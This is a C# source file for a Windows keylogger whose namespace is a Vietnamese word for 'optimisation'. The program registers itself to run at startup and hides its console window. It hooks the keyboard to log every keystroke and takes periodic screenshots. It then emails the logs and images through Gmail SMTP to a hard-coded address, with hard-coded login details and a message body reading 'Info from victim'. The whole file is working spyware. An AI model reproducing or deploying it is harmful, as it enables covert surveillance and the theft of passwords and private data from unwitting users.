using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Toi_uu_hoa
{
    class Program
    {
        #region Hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion; 
                
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(" ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Back")
                {
                    Console.Out.Write(" Back ");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(" Back ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Right")
                {
                    Console.Out.Write(" Right ");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true);
                    output.Write(" Right ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Left")
                {
                    Console.Out.Write(" Left ");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(" Left ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Up")
                {
                    Console.Out.Write(" Up ");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(" Up ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Down")
                {
                    Console.Out.Write(" Down ");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(" Down ");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Return")
                {
                    Console.Out.Write(" Enter\n");
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write(" Enter\n");
                    output.Close();
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    StreamWriter output = new StreamWriter(logNameToWrite, true);
                    output.Write((Keys)vkCode);
                    output.Close();
                }

                CheckHotKey(vkCode);
                //WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static bool isHotKey = false;
        static bool isShowing = true;
        static Keys previoursKey = Keys.Separator;

        static void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.H)
                isHotKey = true;

            if (isHotKey)
            {
                if (!isShowing)
                {
                    DisplayWindow();
                }
                else
                    HideWindow();

                isShowing = !isShowing;
            }

            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }
        #endregion

        #region Capture
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 10000;

        /// <summary>
        /// Capture al screen then save into ImagePath
        /// </summary>
        static void CaptureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            // Save the screenshot to the specified path that the user has chosen.
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {

            }
            imageCount++;
        }

        #endregion

        #region Timer
        static int interval = 1;
        static void StartTimer()
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);

                    if (interval % captureTime == 0)
                        CaptureScreen();

                    if (interval % mailTime == 0)
                        SendMail();

                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        #region Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        #endregion

        #region Registry that open with window
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\Cotanar");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("Cotanar", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
            }
        }
        #endregion

        #region Mail
        static int mailTime = 5000;
        static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("email@gmail.com");
                mail.To.Add("z54360907@gmail.com");
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Info from victim\n";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("pthan2292@gmail.com", "--00110101 00110100 00110011 00110110--");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");

                // Link active gmail
                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion

        static void Main(string[] args)
        {
			StartWithOS();

            StartTimer();
			
			HideWindow();
			
            HookKeyboard();
        }

    }

}
